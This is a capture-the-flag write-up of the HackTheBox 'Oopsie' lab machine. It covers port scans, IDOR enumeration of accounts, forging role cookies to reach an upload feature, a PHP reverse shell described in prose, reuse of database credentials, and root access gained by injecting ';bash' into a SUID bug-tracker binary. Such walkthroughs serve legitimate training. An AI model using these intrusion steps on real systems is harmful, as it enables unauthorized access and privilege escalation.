---
description: Oopsie box from HackTheBox write up.
---

# Oopsie

## nmap scan

Look's like only ports 22 and 80 are open:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Oopsie]
└─$ sudo nmap <MACHINE_IP> -p- -v
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 10:01 EDT
Initiating Ping Scan at 10:01
Scanning <MACHINE_IP> [4 ports]
Completed Ping Scan at 10:01, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:01
Completed Parallel DNS resolution of 1 host. at 10:01, 0.05s elapsed
Initiating SYN Stealth Scan at 10:01
Scanning <MACHINE_IP> [65535 ports]
Discovered open port 22/tcp on <MACHINE_IP>
Discovered open port 80/tcp on <MACHINE_IP>
Completed SYN Stealth Scan at 10:02, 33.14s elapsed (65535 total ports)
Nmap scan report for <MACHINE_IP>
Host is up (0.055s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 33.59 seconds
           Raw packets sent: 65552 (2.884MB) | Rcvd: 66053 (2.747MB)
```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Oopsie]
└─$ sudo nmap <MACHINE_IP> -p 22,80 -sC -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 10:06 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```

## Port 80

Here we find the MegaCorp Automotive website that works with `php` files. With manual enumeration the admin email: `admin@megacorp.com` can be discovered and also a login page at `/cdn-cgi/login/`.

According to `gobuster` a `uploads` directory is present. The server has the directory listing disabled sadly so let's note that for later.

Using a previous challenge password we can login with `admin:MEGACORP_4dm1n!!`!. Once inside, the admin pannel looks like there is an upload feature but requires super admin access, the thing is that this page looks vulnerable to `IDOR` vulnerability in `/cdn-cgi/login/admin.php?content=accounts&id=1` because it is possible to specify any `id` we want. With a little Python script let's look for that super admin account (Burb can be used but hey, i wanted to be creative here):

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Oopsie]
└─$ ./enumerate_users.py
Index: 1 --> <tr><th>Access ID</th><th>Name</th><th>Email</th></tr><tr><td>34322</td><td>admin</td><td>admin@megacorp.com</td></tr>
Index: 2 --> Not exists
Index: 3 --> Not exists
Index: 4 --> <tr><th>Access ID</th><th>Name</th><th>Email</th></tr><tr><td>8832</td><td>john</td><td>john@tafcz.co.uk</td></tr>
Index: 5 --> Not exists
Index: 6 --> Not exists
Index: 7 --> Not exists
Index: 8 --> Not exists
Index: 9 --> Not exists
Index: 10 --> Not exists
Index: 11 --> Not exists
Index: 12 --> Not exists
Index: 13 --> <tr><th>Access ID</th><th>Name</th><th>Email</th></tr><tr><td>57633</td><td>Peter</td><td>peter@qpic.co.uk</td></tr>
Index: 14 --> Not exists
Index: 15 --> Not exists
Index: 16 --> Not exists
Index: 17 --> Not exists
Index: 18 --> Not exists
Index: 19 --> Not exists
Index: 20 --> Not exists
Index: 21 --> Not exists
Index: 22 --> Not exists
Index: 23 --> <tr><th>Access ID</th><th>Name</th><th>Email</th></tr><tr><td>28832</td><td>Rafol</td><td>tom@rafol.co.uk</td></tr>
Index: 24 --> Not exists
Index: 25 --> Not exists
Index: 26 --> Not exists
Index: 27 --> Not exists
Index: 28 --> Not exists
Index: 29 --> Not exists
Index: 30 --> <tr><th>Access ID</th><th>Name</th><th>Email</th></tr><tr><td>86575</td><td>super admin</td><td>superadmin@megacorp.com</td></tr>
Index: 31 --> Not exists
Index: 32 --> Not exists
```

Our super admin account has the id 30. Checking the page cookies i found 2 of them: user (The access key id) and role, because they are just plain text values we can change it to whatever we want. In this case:

```
role=super admin
user=86575
```

Now we can use the upload feature and get a potencial RCE.

### Reverse shell

To get a reverse shell we have to upload a PHP reverse shell to the page and after setting up the listenner we can just execute it in `/uploads/ourFile.php`.


## Privesc

### As www-data in the box

Looking around the box i found the credentials for the database:

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php 
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

Maybe we can try that credentials to get access to the box robert account:

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
Password: M3g4C0rpUs3r!
robert@oopsie:/var/www/html/cdn-cgi/login$
```

Cool! We have `ssh` access too now.

### As robert in the box

The user flag is in `/home/robert/user.txt`. Looking around, looks like `robert` is part of the `bugtracker` group. This group can execute a SUID binary owned by `root`.

The program basically executes `cat /root/reports/` with a 'bug id' concatenated to the end but it doesn't sanitize the user input so we can abuse it:

```bash
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ;id
---------------

cat: /root/reports/: Is a directory
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

As we can see, we executed the `id` command as `root` since this program has the SUID binary set, lets get `root` access:

```bash
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ;bash
---------------

cat: /root/reports/: Is a directory
root@oopsie:/# 
```

The `root` flag is in `/root/root.txt`.
